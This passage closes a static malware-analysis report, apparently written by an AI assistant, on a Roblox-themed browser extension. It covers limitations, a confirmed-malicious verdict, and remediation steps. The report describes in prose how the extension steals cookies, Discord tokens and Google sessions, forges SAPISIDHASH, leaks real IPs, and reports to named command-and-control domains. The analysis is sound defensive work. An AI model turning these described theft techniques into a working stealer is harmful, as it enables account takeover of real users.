- **Minification and long lines** — a build artifact, not obfuscation. Distinguished from the *targeted* naming concealment in the `_w7k` module, which I do treat as deliberate.
- **Base64 (`btoa`) on payload fields** — transport encoding for multi-line text in form-urlencoded bodies, not concealment.
- **`chrome.storage.local` usage for `mrbxInstallId`, `mrbxWorkerDir`** — mundane client bookkeeping in isolation (though it serves the theft pipeline).
- **PNG icons** — verified clean: each file's `IEND` chunk ends exactly at EOF with zero trailing bytes. No steganography or appended payload.
- **`theme.css`, `styles/*.css`, `popup.html`** — ordinary presentation code. No trackers, no remote resources, no hidden iframes. `popup.html` loads only two local scripts.
- **`RTCPeerConnection`** — legitimate in many contexts; here the RFC1918 filtering and `_realIp` field name make the intent unambiguous, so I do **not** treat it as a false positive.
- **No supply-chain compromise** — zero third-party dependencies. Nothing here can be blamed on a poisoned package.

---

## Limitations

Static analysis cannot establish the following. **"Not observed" is not "proven absent."**

1. **Server-side behavior is entirely opaque.** I did not contact `multiroblox.at` (per your instructions). What `userinfo.php`, `pull_poll.php`, `check.php`, or `ext-key.php` do with the stolen data, what jobs `pulls[]` can contain beyond `{id, username}`, and what `downloadUrl(token)` serves are all **unknown**.
2. **Absent modules.** `RbxWalletCollector`, `RbxApi`, and `__mrmRunMultipleRobloxLikeStart` are referenced but undefined in this build. Their *call sites, payload schemas, and size limits* are confirmed; their *implementations* are not present. They may be supplied by a different variant, a later version, or a bundle I do not have. I have scored F-6 and F-9 at Medium confidence accordingly.
3. **No handler exists for `rbx-get-bearer-tokens`** in this build, though `accounts-manager.js:3980` requests it and would attach `body.bearerTokens`. The intent to capture Authorization headers is visible; the mechanism is not present here. (Consistent with this, the manifest requests no `webRequest` permission.)
4. **Future behavior is server-controlled.** The operator can change targeting, cadence, and jobs at any time without touching the extension. A benign-looking poll today can become an active pull tomorrow.
5. **Update mechanism is unknown.** Distributed outside the Chrome Web Store, so updates arrive by whatever means the vendor site chooses. I found no in-extension auto-updater, but **static analysis cannot rule out** a future version with expanded or different capabilities — including the missing modules above.
6. **Sibling campaigns not analyzed.** `rbxmodes.pro` and `rocustomize.pro` are granted host permissions and are almost certainly related variants, but I have no samples of them.
7. **No runtime validation.** Per your constraint, I did not execute, install, or load anything. Conclusions about *what runs when* derive from reading control flow (listener registration, top-level statements, timer setup), not from observation. I regard these as high-confidence but not runtime-verified.
8. **No upstream development history.** The repository contains only the three sample-upload commits. The extension's own version history, and whether earlier versions differed, cannot be determined from here.
9. **Encrypted or remotely-held logic.** None found — but absence of evidence in a 300 KB bundle is not proof.

---

## Final Assessment

## ⛔ Confirmed malicious functionality

This is the highest category, and it is met with a wide margin. The determination does not rest on any single ambiguous indicator.

### Confirmed behavior — directly demonstrated by the code

- Exfiltration of the **entire browser cookie store** to `multiroblox.at`, automatically, without user action (F-1)
- **Remote command-and-control loop** (`pull_poll.php`) permitting operator-directed, on-demand theft of any named victim's live Roblox session (F-2)
- **Deliberate stripping of Roblox's anti-theft warning** from stolen credentials (F-3)
- **Discord token theft** via script injection into Discord tabs (F-4)
- **Google session theft plus SAPISIDHASH forgery** to authenticate as the victim (F-5)
- **WebRTC real-IP de-anonymization** with private ranges explicitly filtered out (F-7)
- **Browser screenshot capture** attached to the exfil payload (F-8)
- **Mass email harvesting** across 170 domains and 20 webmail providers (F-10)
- **YouTube monetization profiling** for victim-value assessment (F-11)
- **Persistent background operation** via alarms and startup hooks (F-12)
- **The advertised multi-instance feature does not exist** — the function is referenced once and never defined (F-13)
- **Evasion**: spoofed User-Agent, self-throttled exfiltration, server kill-switch (F-14)

### Strong indicators

- **Crypto seed-phrase exfiltration slot** — `mnemonics` field with enforced size limits and a dispatch path, but no collector in this build (F-9)
- **Multi-brand campaign infrastructure** — `rbxmodes.pro`, `rocustomize.pro`, `rbxlabs-mark.svg`, and a templated `profile.json` slug schema
- **Professional operation** — localhost:3000-3010 dev backend, install-ID tracking, API-key auth, duplicate-suppression accounting, version-gated kill-switch

### Potential risk

- **Silent secondary-payload download** (F-6) — the `downloads` capability and token-fetch code are confirmed; `RbxApi.downloadUrl` is not defined in this build, and the extension cannot execute what it downloads

### No evidence found — specifically investigated

- Arbitrary code execution (`eval`, `new Function`, dynamic `import`, remote scripts, WebAssembly) — **none**
- Native messaging, native binaries, DLLs, installers, drivers — **none**
- Shell/PowerShell/registry access, process spawning, startup-folder persistence — **none**
- Supply-chain compromise (no dependencies exist), GitHub Actions, install hooks — **none**
- Steganographic payloads in images — **none** (all PNGs verified clean to the byte)
- Deleted or concealed malicious code in Git history — **none**; the archive matches the tree exactly

---

## Recommended Actions

If this extension was ever loaded in a real browser, treat it as **a full compromise of every account that browser was logged into**, not a Roblox-only incident:

1. **Remove the extension** and do not load it again.
2. **From a different, known-clean device**, change passwords and **revoke all active sessions** for: Roblox, Google, Discord, Microsoft/Outlook, and any crypto exchange, payment, commerce, social, or code-hosting account used in that browser. Password changes alone are insufficient — **stolen session cookies survive them**; you must explicitly sign out all devices / revoke sessions.
3. **Roblox specifically:** Settings → Security → *Sign out of all other sessions*, reset password, enable 2-Step Verification, and review transactions and trades.
4. **Google:** Security → *Your devices* → sign out all, revoke third-party app access, reset password, enable 2FA.
5. **Discord:** change password (this invalidates tokens), enable 2FA.
6. **If any crypto wallet was ever used in that browser profile, move the funds now** to a wallet with a newly generated seed. Assume the seed is compromised — the exfiltration schema was explicitly built for it.
7. **Clear the entire browser profile** (cookies, storage, cache) — or, preferably, create a fresh profile.
8. Assume the operator holds the victim's **real IP address, email addresses, and a screenshot** of the browser.
9. Report the domains `multiroblox.at`, `rbxmodes.pro`, and `rocustomize.pro` to Google Safe Browsing and your security vendor.

---

**Methodology note:** Every conclusion above derives from reading, searching, and statically transforming files. I did not install, load, execute, build, or test any repository content; I did not contact `multiroblox.at` or any other discovered endpoint; I ran no package manager and no project tooling. The one archive I opened (from Git history) was listed with `unzip -l`, which enumerates the table of contents without extracting or running anything. The beautified copies I read were produced by `sed` text substitution into my scratchpad, leaving the repository unmodified.

I can publish this as a shareable page if you want to send it to anyone — say the word.
